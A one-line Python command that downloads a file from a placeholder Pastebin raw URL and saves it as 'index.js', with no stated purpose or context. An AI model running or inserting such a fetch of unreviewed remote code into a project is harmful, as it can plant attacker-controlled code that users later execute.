python3 -c "
import urllib.request
url = 'https://pastebin.com/raw/XXXXX'
urllib.request.urlretrieve(url, 'index.js')
print('Done!')"
